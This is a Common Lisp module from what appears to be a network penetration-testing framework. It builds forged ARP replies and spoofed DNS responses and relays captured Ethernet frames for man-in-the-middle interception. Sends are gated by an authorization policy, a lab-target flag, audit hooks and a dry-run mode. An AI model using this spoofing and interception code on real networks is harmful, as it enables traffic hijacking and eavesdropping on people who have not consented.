(in-package #:nrecon.attack)

(defun %option (options key)
  (let ((string-key (string-downcase (symbol-name key))))
    (cond
      ((hash-table-p options)
       (or (gethash key options)
           (gethash string-key options)))
      ((listp options) (getf options key))
      (t nil))))

(defun %job-options (input)
  (if (typep input 'job)
      (job-options input)
      input))

(defun %context-option (context key)
  (%option context key))

(defun %json-bool (value)
  (if value t cl-json-kit:+json-false+))

(defun render-attack-plan (action target policy packet-length)
  "Return a JSON dry-run plan. This function never opens or sends a packet."
  (check-type packet-length (integer 0 *))
  (let* ((decision (%decision policy action target))
         (object (make-hash-table :test #'equal)))
    (setf (gethash "action" object) (%action-name action)
          (gethash "authorized" object)
          (%json-bool (authorization-decision-allowed-p decision))
          (gethash "dry_run" object) t
          (gethash "packet_length" object) packet-length
          (gethash "reason" object)
          (string-downcase (symbol-name (authorization-decision-reason decision)))
          (gethash "target" object)
          (nrecon.core:authorization-target-host target))
    (cl-json-kit:stringify object :sort-keys t)))

(defun %packet-for-options (action options)
  (case action
    (:arp-spoof
     (build-arp-reply
      :source-mac (%option options :source-mac)
      :source-ip (%option options :spoofed-ip)
      :target-mac (%option options :target-mac)
      :target-ip (%option options :target-ip)))
    (:dns-spoof
     (build-dns-response-frame
      :source-mac (%option options :source-mac)
      :source-ip (%option options :spoofed-ip)
      :target-mac (%option options :target-mac)
      :target-ip (%option options :target-ip)
      :query-name (%option options :query-name)
      :identifier (or (%option options :identifier) 0)
      :source-port (or (%option options :source-port) 53)
      :destination-port (or (%option options :destination-port) 53000)
      :answer-ttl (or (%option options :answer-ttl) 60)
      :answer-ip (%option options :answer-ip)))
    (otherwise (error "Unsupported nrecon attack action: ~S." action))))

(defun run-mitm-relay (frame &key source-mac destination-mac interface-mac
                                    target-host (target-lab-p nil)
                                    authorization-policy audit-fn sender interface
                                    (timeout 1.0) deadline dry-run)
  "Relay one already-captured Ethernet frame after rewriting its L2 addresses.
The capture loop is supplied by the caller; every relay send uses the gate."
  (let* ((bytes (%check-octets frame))
         (expected-source (%mac-octets source-mac))
         (expected-destination (%mac-octets destination-mac)))
    (unless (and (>= (length bytes) 14)
                 (equalp (subseq bytes 0 6) expected-destination)
                 (equalp (subseq bytes 6 12) expected-source))
      (error "Captured frame MACs do not match the requested relay endpoints."))
    (let* ((packet (rewrite-l2-frame bytes interface-mac destination-mac))
           (target (make-authorization-target :host target-host
                                              :lab-p target-lab-p)))
      (if dry-run
          (render-attack-plan :mitm-proxy target authorization-policy
                              (length packet))
          (%send-packet packet :mitm-proxy target authorization-policy audit-fn
                        :sender sender :interface interface
                        :timeout timeout :deadline deadline)))))

(defun run-attack (input context)
  (let* ((options (%job-options input))
         (action (%option options :action))
         (target-host (or (%option options :target-ip)
                          (and (typep input 'job)
                               (nrecon.core:job-target input))))
         (target-lab-p (%context-option context :target-lab-p))
         (policy (%context-option context :authorization-policy))
         (timeout (or (%option options :timeout) 1.0))
         (target (make-authorization-target :host target-host
                                            :lab-p target-lab-p)))
    (if (eq action :mitm-proxy)
        (run-mitm-relay
         (%option options :frame)
         :source-mac (%option options :source-mac)
         :destination-mac (%option options :destination-mac)
         :interface-mac (%option options :interface-mac)
         :target-host target-host
         :target-lab-p target-lab-p
         :authorization-policy policy
         :audit-fn (%context-option context :audit-fn)
         :sender (%context-option context :sender)
         :interface (%option options :interface)
         :timeout timeout
         :dry-run (%option options :dry-run))
        (let ((packet (%packet-for-options action options)))
          (if (%option options :dry-run)
              (render-attack-plan action target policy (length packet))
              (%send-packet packet action target policy
                            (%context-option context :audit-fn)
                            :sender (%context-option context :sender)
                            :interface (%option options :interface)
                            :timeout timeout))))))

(define-module attack
  :capabilities (:arp-spoof :dns-spoof :mitm-proxy)
  :options (action target-ip target-mac source-mac spoofed-ip query-name
            identifier source-port destination-port answer-ttl answer-ip
            interface interface-mac destination-mac frame timeout dry-run)
  :run run-attack)
